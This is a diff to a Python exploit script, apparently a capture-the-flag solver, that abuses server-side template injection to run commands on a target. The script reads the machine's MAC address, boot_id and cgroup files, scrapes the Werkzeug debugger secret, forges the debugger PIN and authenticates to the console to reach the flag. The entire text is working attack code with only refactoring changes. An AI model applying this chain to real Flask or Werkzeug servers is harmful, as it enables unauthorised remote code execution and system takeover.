@@ -266,9 +266,9 @@ def ssti(cmd):
     return res.text
 
 def secret():
-    res2 = ssti("curl localhost:8000/console")
-    secret = re.findall("[0-9a-zA-Z]{20}",res2)
-    return secret[0]
+    s = ssti("curl localhost:8000/console")
+    s_ = re.findall("[0-9a-zA-Z]{20}",s)
+    return s_[0]
 
 def get_uuid_node():
     u = ssti("cat /sys/class/net/eth0/address")
@@ -277,11 +277,11 @@ def get_uuid_node():
     return int(u1.replace(":", ""), 16)
 
 def get_machine_id():
-    t = ssti("cat /proc/sys/kernel/random/boot_id")
+    t = ssti("cat /proc/sys/kernel/random/boot_id").split("(b&#39;")[1].split("\\n")[0]
     t1 = ssti("cat /proc/self/cgroup").split("/")[2].split("\\n")[0]
     #match = re.search(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}", t)
-    match = t.split("(b&#39;")[1].split("\\n")[0]
-    return match + t1
+    #match = t.split("(b&#39;")[1].split("\\n")[0]
+    return t + t1
 
 def generate_pin():
     probably_public_bits = [
@@ -324,9 +324,7 @@ def generate_pin():
     return rv
 
 def pinauth():
-    s = secret()
-    g = generate_pin()
-    res = ssti(f"curl%20-G%20-i%20localhost:8000/console%20--data-urlencode%20__debugger__=yes%20--data-urlencode%20s={s}%20--data-urlencode%20frm=0%20--data-urlencode%20cmd=pinauth%20--data-urlencode%20pin={g}")
+    res = ssti(f"curl%20-G%20-i%20localhost:8000/console%20--data-urlencode%20__debugger__=yes%20--data-urlencode%20s={secret()}%20--data-urlencode%20frm=0%20--data-urlencode%20cmd=pinauth%20--data-urlencode%20pin={generate_pin()}")
     return re.findall(r"__wzd\S*[^\W]",res)[0]
 
 def get_flag():
